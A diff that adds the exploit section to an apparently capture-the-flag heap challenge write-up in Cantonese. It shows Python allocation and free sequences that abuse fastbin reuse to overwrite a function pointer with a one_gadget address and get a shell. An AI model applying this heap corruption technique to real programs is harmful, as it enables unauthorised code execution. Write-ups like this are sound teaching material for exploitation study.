@@ -88,4 +88,42 @@ leakk=leak("DDDDDDD",0)
 
 只要利用smallbin free完之後嘅fd bk pointer再配合puts leak libc heapbase 出黎(可以參考[Mental Snapshot - _int_free and unlink](http://uaf.io/exploitation/misc/2016/09/11/_int_free-Mental-Snapshot.html))  
 
+Exploit :
+
+首先我地要malloc 一個Fastbin with content <0x20 嘅chunk 加兩個好大嘅chunk ,1個 padding (add(3,128,"X"))
+)
+
+係malloc 細chunk(add(0,30,"X"))嘅時候,由於function pointer 同content pointer 屬於0x20 bin ,就會拎返屬於以前table[0] table[1] function pointer 嘅address
+
+```python
+add(0,30,"X")
+add(1,800,"T"*300)
+add(2,500,"B"*300)
+add(3,128,"X")
+```
+再用呢個次序free左佢
+ 
+咁下一次malloc嘅function pointer位置會拎到上面細chunk content位置(fastbin LIFO features)
+
+Content 會放左係之後,而且會覆蓋到以前嘅chunk(2 and 3)
+
+```python
+free(3)
+free(2)
+free(1)
+free(0)
+```
+再一個大chunk (size=900)我地會完整覆蓋到以前嘅chunk3
+ 
+係chunk 3 function pointer 位置放one gadget
+再去menu spell->3 get shell
+
+```python
+known_heap=heapbase+0x190
+rop=p64(pop_rax_ret)+p64(system)
+
+add(1,900,"Q"*(96+48)+p64(one_gadget))
+
+```
+
 
